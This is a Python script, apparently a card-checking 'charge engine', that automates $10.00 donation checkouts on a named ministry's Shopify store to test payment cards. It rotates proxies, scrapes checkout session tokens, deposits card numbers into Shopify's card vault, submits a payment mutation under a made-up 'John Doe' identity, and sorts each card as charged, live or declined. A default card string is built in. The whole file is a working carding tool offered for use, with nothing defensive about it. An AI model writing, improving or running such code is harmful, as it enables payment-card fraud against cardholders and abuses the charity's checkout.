"""
Shopify Charge Engine ($10.00 Donation on wiredministries.com)
Completely re-engineered Step 4 with dynamic negotiation mutation and live receipt polling.
"""
import requests
import re
import json
import html
import sys
import uuid
import random
import time

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

# Load pointtoserver rotation proxies
try:
    with open('alone_checker_bot/test_proxies.txt') as f:
        PROXIES = [l.strip() for l in f if l.strip()]
except Exception:
    PROXIES = []

def get_proxy():
    if not PROXIES:
        return None
    p = random.choice(PROXIES)
    if "@" in p:
        user_pass, host_port = p.split("@")
        return f"http://{user_pass}@{host_port}"
    return f"http://{p}"

def check_card_shopify_charge(card_str, proxy_url=None):
    card_clean = card_str.strip()
    parts = card_clean.split('|')
    if len(parts) < 4:
        return card_clean, "Invalid format (cc|mm|yy|cvv)", False
    
    n, mm, yy, cvc = [p.strip() for p in parts[:4]]
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    proxy_formatted = proxy_url if proxy_url else get_proxy()
    proxies = {"http": proxy_formatted, "https": proxy_formatted} if proxy_formatted else None

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    })

    # STEP 1 - Add product to cart ($10.00 / donation product)
    headers1 = {
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW',
        'origin': 'https://wiredministries.com',
        'referer': 'https://wiredministries.com/products/donate',
    }
    data1 = (
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="quantity"\r\n\r\n1\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="add"\r\n\r\n\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
        'Content-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n'
        '------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
    )
    r1 = s.post('https://wiredministries.com/cart/add', headers=headers1, data=data1, proxies=proxies, timeout=15)
    if r1.status_code != 200:
        return card_clean, f"Failed adding product (HTTP {r1.status_code})", False

    # STEP 2 - Checkout init & parse meta tokens
    r_co = s.post('https://wiredministries.com/cart', data={'updates[]': '1', 'note': '', 'checkout': 'Check out'}, proxies=proxies, timeout=15)
    checkout_html = r_co.text

    def get_meta(name):
        m = re.search(rf'<meta name="{name}" content="([^"]+)"', checkout_html)
        if m:
            raw_val = html.unescape(m.group(1))
            return raw_val.strip('"')
        return None

    session_token = get_meta("serialized-sessionToken")
    source_token = get_meta("serialized-sourceToken")
    if not session_token:
        return card_clean, "Failed to retrieve Shopify sessionToken", False

    # STEP 3 - Deposit Card to Shopify CS Vault
    headers3 = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://checkout.shopifycs.com',
        'referer': 'https://checkout.shopifycs.com/',
    }
    json_data3 = {
        'credit_card': {'number': n, 'month': mm, 'year': yy, 'verification_value': cvc, 'name': 'John Doe'},
        'payment_session_scope': 'wiredministries.com'
    }
    res3 = requests.post('https://deposit.shopifycs.com/sessions', headers=headers3, json=json_data3, proxies=proxies, timeout=15)
    vault_data = res3.json()
    vault_session_id = vault_data.get('id')
    if not vault_session_id:
        err_msg = vault_data.get('message') or "Card Tokenization Failed"
        return card_clean, f"DECLINED ❌ ({err_msg})", False

    # STEP 4 - Submit Payment to Shopify GraphQL Engine with valid types
    headers4 = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://wiredministries.com',
        'referer': f'https://wiredministries.com/checkouts/cn/{source_token}/en-us',
        'x-checkout-one-session-token': session_token,
    }

    attempt_token = str(uuid.uuid4())
    mutation_submit = {
        'query': '''mutation SubmitForCompletion($attemptToken: String!, $input: NegotiationInput!) {
          submitForCompletion(attemptToken: $attemptToken, input: $input) {
            __typename
            ... on SubmitSuccess {
              receipt {
                __typename
                ... on ProcessedReceipt {
                  id
                  confirmationPage { url }
                }
                ... on FailedReceipt {
                  id
                  processingError {
                    __typename
                    ... on PaymentFailed {
                      code
                      messageUntranslated
                    }
                  }
                }
              }
            }
            ... on SubmittedForCompletion {
              receipt {
                __typename
                ... on FailedReceipt {
                  id
                  processingError {
                    __typename
                    ... on PaymentFailed {
                      code
                      messageUntranslated
                    }
                  }
                }
                ... on ProcessedReceipt {
                  id
                  confirmationPage { url }
                }
              }
            }
            ... on SubmitFailed {
              reason
            }
          }
        }''',
        'variables': {
            'attemptToken': attempt_token,
            'input': {
                'sessionInput': {
                    'sessionToken': session_token
                },
                'payment': {
                    'totalAmount': {
                        'value': {
                            'amount': '10.00',
                            'currencyCode': 'USD'
                        }
                    },
                    'paymentLines': [
                        {
                            'amount': {
                                'value': {
                                    'amount': '10.00',
                                    'currencyCode': 'USD'
                                }
                            },
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'sessionId': vault_session_id,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'firstName': 'John',
                                            'lastName': 'Doe',
                                            'address1': '123 Main St',
                                            'city': 'New York',
                                            'zoneCode': 'NY',
                                            'postalCode': '10001',
                                            'countryCode': 'US',
                                            'phone': '2125551234'
                                        }
                                    }
                                }
                            }
                        }
                    ]
                },
                'buyerIdentity': {
                    'email': 'johndoe9981@gmail.com'
                }
            }
        },
        'operationName': 'SubmitForCompletion'
    }

    r_sub = s.post('https://wiredministries.com/checkouts/unstable/graphql', headers=headers4, json=mutation_submit, proxies=proxies, timeout=20)
    res_text = r_sub.text

    # Parse and classify outcome
    if "ProcessedReceipt" in res_text or "confirmationPage" in res_text or "Thank you for your order" in res_text:
        return card_clean, "CHARGED ✅ ($10.00)", True
    elif "incorrect_cvc" in res_text or "security code is incorrect" in res_text:
        return card_clean, "APPROVED 🟩 (CVV Mismatch / Live)", True
    elif "insufficient_funds" in res_text:
        return card_clean, "APPROVED 🟩 (Insufficient Funds)", True
    elif "card_declined" in res_text or "PaymentFailed" in res_text:
        match_msg = re.search(r'"messageUntranslated":"([^"]+)"', res_text)
        err = match_msg.group(1) if match_msg else "Card Declined"
        return card_clean, f"DECLINED 🔴 ({err})", False
    else:
        match_reason = re.search(r'"reason":"([^"]+)"', res_text) or re.search(r'"message":"([^"]+)"', res_text)
        err = match_reason.group(1) if match_reason else "Payment Failed"
        return card_clean, f"DECLINED 🔴 ({err})", False

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    print(f"[*] Testing Fixed Shopify Step 4 with Rotation Proxy on: {test_c}")
    start = time.time()
    c, msg, is_live = check_card_shopify_charge(test_c)
    elapsed = round(time.time() - start, 2)
    print(f"\nResult: {msg}\nCard: {c}\nLive: {is_live}\nTime: {elapsed}s")
